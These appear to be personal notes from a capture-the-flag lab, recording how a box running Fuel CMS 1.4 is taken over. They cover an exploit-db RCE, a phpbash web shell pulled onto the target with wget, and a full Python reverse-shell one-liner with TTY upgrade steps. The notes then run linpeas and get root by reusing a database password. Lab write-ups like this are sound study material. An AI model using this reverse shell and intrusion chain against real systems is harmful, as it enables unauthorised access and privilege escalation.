the server is running fuel cms 1.4 and that is vulnerable to rce 

downloaded an exploit from exploit-db

so with that i gained rce but its kinda wonky so i need to get a better reverse shell

read in a writeup that its possible to upload something called phpbash which will give us some kind of a reverse shell in the browser

downloaded it here: https://github.com/Arrexel/phpbash

hosted it with python3 -m http.server 8081 

then downloaded it on the victim machine with wget 10.9.58.163:8081/phpbash.php 

then accessed it via browser on http://10.10.39.156/phpbash.php 

used instructions from /res to get a socat reverse shell

uploaded and ran linpeas

found some .sh files in /usr/sbin/alsa-info.sh and /usr/bin/amuFormat.sh and /usr/bin/getttext.sh

oh and i also had to upgrade the shell with python 

also found a pretty useful command in the writeup for a fully interactive shell:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOURIPADDRESS",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`

After you run that in phpbash, you should see a new message on your netcat listener and have a dollar sign. If you type whoami on it, you will see you now have a reverse shell as ‚Äúwww-data‚Äù. However this shell still won‚Äôt do what we want it to, so we need to get full tty for an interactive shell. First, enter this python command: python -c 'import pty; pty.spawn("/bin/bash")'.Then, press CTRL+Z to put the shell in the background. Next, type this command in the same window: stty raw -echo;fg. This will bring your shell back to the foreground with full interactive experience.


so linpeas showed some credentials for a database where the password was: mememe 

tried these with su root and they worked...
